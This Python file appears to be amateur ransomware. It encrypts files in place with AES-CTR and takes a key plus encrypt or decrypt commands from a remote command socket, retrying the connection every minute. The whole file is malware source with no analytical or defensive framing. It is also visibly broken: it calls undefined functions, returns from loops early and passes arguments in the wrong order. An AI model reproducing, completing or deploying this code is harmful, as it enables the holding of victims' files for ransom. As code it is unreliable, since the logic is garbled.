import os
import time
import socket
import tkinter
from time import sleep 
from tkinter import *
from tkinter import scrolledtext
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Util import Counter

			

def data():
    ap = []
    ex = ['png '  , 'txt' , 'mp4' , 'py' , 'jpg' ]
    for i  , f , d in os.walk('moado'):
        for z in d :
            full_path = os.path.join( i , z  )
            full_path.split('.')[-1]
            ap.append(full_path)
        return ap
        

  
def partions():
    par = []
    for i in range( 65 , 101):
        x=chr(i)
        par.append(x)
        if os.path.exists(x):    
            return par
      

  
def encrypt(file , key):
    counter = Counter.new(128)
    c=AES.new(key , AES.MODE_CTR , counter=counter )
    with open(file, 'r+b')as f :
        data = os.path.getsize(file)
        block = f.read(data)
        while block:
            f.seek(-len(block) , 1)
            f.write(c.encrypt(block))
            block = f.read(data)
        f.close()
        return [key]







def decrypt(file , key ):
    counter = Counter.new(128)
    c=AES.new(key , AES.MODE_CTR , counter=counter )
    with open(file , 'r+b')as f :
        data = os.path.getsize(file)
        block = f.read(data)
        while block:
            f.seek(-len(block) , 1)
            f.write(c.decrypt(block))
            block = f.read(data)
        f.close()





        



key =Random.new().read(16)
files  = data()

def client():
	port = 4545
	ip = "127.0.0.1"
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((ip,port))
		while True:
			command = s.recv(2048)
			command = command.decode('ascii')
			if "key" in command:
				padding = lambda data_key:data_key + (16 -len(data_key) % 16) * "*"
				key = padding(command.split(" ")[1]).encode('ascii')
				s.send(b'\n the key is saved\n')
			if command == "en":
				files = dir_f_list("/home/abdallah/Desktop/new")
				for f in files:
					encryption(key,f)
				s.send(b'\ndone\n')
			if command == "de":
				files = dir_f_list("/home/abdallah/Desktop/new")
				for f in files:
					decryption(key,f)
				s.send(b'done')
	except socket.error as e:
		print("trying to connect with server with in 60 sec")
		time.sleep(60)
		s.close()
		client()

client()
